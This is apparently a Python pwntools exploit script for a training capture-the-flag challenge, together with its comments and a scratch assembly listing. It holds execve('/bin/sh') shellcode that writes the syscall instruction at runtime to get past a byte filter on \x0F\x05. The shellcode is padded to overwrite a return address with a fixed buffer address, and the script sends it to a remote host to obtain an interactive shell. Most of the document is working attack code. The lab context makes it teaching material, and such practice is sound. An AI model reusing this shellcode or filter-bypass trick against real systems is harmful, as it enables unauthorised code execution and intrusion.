from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

#r = process("./syscall") 
r = remote("bin.training.jinblack.it", 3101)

'''
Inject a shellcode without using the istruction syscall in hex \x0F\x05.

Solution
Since we cannot write directly in our shellcode syscall, we have to find a workaround. A possible way is to write in ebx \x05\x0e and then add to ebx 1. We then can write the content of ebx (which is the hex for syscall) directly on the stack after we setup the registers. Since the istruction will occupy 8 bytes we creates an nop pad and using mov [rip], ebx we write syscall in the stack after the mov istruction.

jmp binsh
back:
xor rax, rax
mov al, 0x3b
pop rdi
xor rsi, rsi
xor rdx,rdx
xor ebx, ebx
mov ebx, 0x50e
add ebx, 0x1
mov [rip], ebx
nop
nop
nop
nop
nop
nop
nop
nop

binsh:
call back
jmp binsh
beforethemove:
mov rax, 0x3b
pop rdi
xor rsi, rsi
xor rdx, rsi
xor rbx, rbx
mov rbx, 0x050e
add rbx, 0x1
mov [rip], rbx
nop
nop
nop
nop
nop
nop
nop
nop


binsh:
call beforethemove
'''




'''
gdb.attach(r, """
	b *(prog+53)
	c
	ni 2
	si
	ni 5
""")
'''





shellcode_64 = b"\xEB\x2B\x48\xC7\xC0\x3B\x00\x00\x00\x5F\x48\x31\xF6\x48\x31\xF2\x48\x31\xDB\x48\xC7\xC3\x0E\x05\x00\x00\x48\x83\xC3\x01\x48\x89\x1D\x00\x00\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90\xE8\xD0\xFF\xFF\xFF/bin/sh\x00"
#shellcode = b"A" * 216 + p64(0x00404080) 
shellcode = shellcode_64.ljust(216,b"A") + p64(0x00404080) #+ b"/bin/sh\x00"
#shellcode = shellcode + b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaah" 
shellcode = shellcode.ljust(1000, b"C") #+ p64(0x404080) 
print(shellcode)
#print("lunghezza in bytes dello shellcode: "+ str(len(shellcode)))

r.send(shellcode)

r.interactive()

input("ls")
